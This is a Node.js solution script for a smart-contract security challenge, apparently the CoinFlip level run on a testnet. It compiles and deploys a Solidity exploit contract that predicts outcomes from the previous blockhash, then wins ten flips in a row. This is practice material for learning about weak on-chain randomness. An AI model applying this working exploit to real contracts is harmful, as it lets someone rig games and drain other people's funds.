const solc = require('solc');
const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"consecutiveWins","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xe6f334d7"},{"inputs":[{"internalType":"bool","name":"_guess","type":"bool"}],"name":"flip","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0x1d263f67"}];

const exploitContractCode = `
    pragma solidity 0.8.19;

    interface ICoinFlip {
        function flip(bool _guess) external returns (bool);
    }

    contract CoinFlipExploit {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        function flip(address _contract) public {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            ICoinFlip(_contract).flip(side);
        }
    }
`;

const input = {
    language: 'Solidity',
    sources: {
        'CoinFlipExploit.sol': {
            content: exploitContractCode
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*']
            }
        },
    }
};


async function solve(privateKey, contractAddress, contractAbi) {
    const targetContract = new ethers.Contract(contractAddress, contractAbi, provider);
    if (await isSolved(targetContract)) {
        console.log('Challenge already solved');
        return;
    }

    console.log('Getting solc version...');
    const solc_0_8_19 = await getSolcVersion('v0.8.19+commit.7dd6d404');

    console.log('Compiling exploit contract...');
    const output = JSON.parse(solc_0_8_19.compile(JSON.stringify(input)));
    const failed = output.errors.some((error) => error.severity === 'error');
    if (failed) {
        console.error('Failed to compile exploit contract');
        output.errors.forEach((error) => console.error(error.formattedMessage));
        process.exit(1);
    }
    const exploitContractBytecode = output.contracts['CoinFlipExploit.sol'].CoinFlipExploit.evm.bytecode.object;
    const exploitContractAbi = output.contracts['CoinFlipExploit.sol'].CoinFlipExploit.abi;

    const account = new ethers.Wallet(privateKey, provider);
    const factory = new ethers.ContractFactory(exploitContractAbi, exploitContractBytecode);

    console.log('Deploying exploit contract...');
    const exploitInstance = await factory.connect(account).deploy();

    console.log('Exploit contract deployed at', await exploitInstance.getAddress());

    for (let i = 0; i < 10; i++) {
        console.log('Fliping coin...');
        const flipTx = await exploitInstance.flip(contractAddress);
        const result = await flipTx.wait();

        const consecutiveWins = await targetContract.consecutiveWins();
        console.log('Consecutive wins:', consecutiveWins);

        if (consecutiveWins >= 10) {
            break;
        }
    }

    if (await isSolved(targetContract)) {
        console.log('Challenge solved!');
    } else {
        console.log(`Failed to solve. Consecutive wins is less than expected`);
        process.exit(1);
    }
}

async function isSolved(contract) {
    const consecutiveWins = await contract.consecutiveWins();
    return consecutiveWins >= 10;
}


function getSolcVersion(version) {
    return new Promise((resolve, reject) => {
        solc.loadRemoteVersion(version, (err, solcV) => {
            if (err) {
                reject(err);
            } else {
                resolve(solcV);
            }
        });
    });
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('Please provide private key as an argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('Please provide contract address as an argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
